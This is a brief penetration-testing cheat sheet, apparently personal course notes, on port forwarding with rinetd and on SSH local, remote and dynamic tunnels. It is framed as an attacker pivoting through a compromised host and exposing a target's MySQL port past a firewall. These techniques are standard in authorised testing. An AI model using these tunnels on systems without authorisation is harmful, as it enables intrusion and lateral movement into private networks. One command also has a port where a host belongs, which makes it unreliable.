# Port forwarding

### rinetd

```text
rinetd
cat /etc/rinetd.conf
0.0.0.0 <local_port> <target> <target_port>
sudo service rinetd restart
ss -antp
```

### SSH

```text
# run on target machine
ssh -R 4444:127.0.0.1:3306 kali@<lhost>

# now you can connect to target's mysql port from your kali machine
mysql -u root -h 127.0.0.1 -P 4444
```

```text
# -L local
# -R remote
# -D dynamic

# attacker(a) <---internet---> initial_target(i) <---local_network---> target(t)
a> ssh -N -L 0.0.0.0:<a_port>:<t_ip>:<t_port> <user>@<i_port>

# attacker(a) <---firewall---> target(t)
t> ssh -N -R <a_ip>:<a_port>:localhost:<t_port> <user>@<a_ip>

# cont. on page 606
```

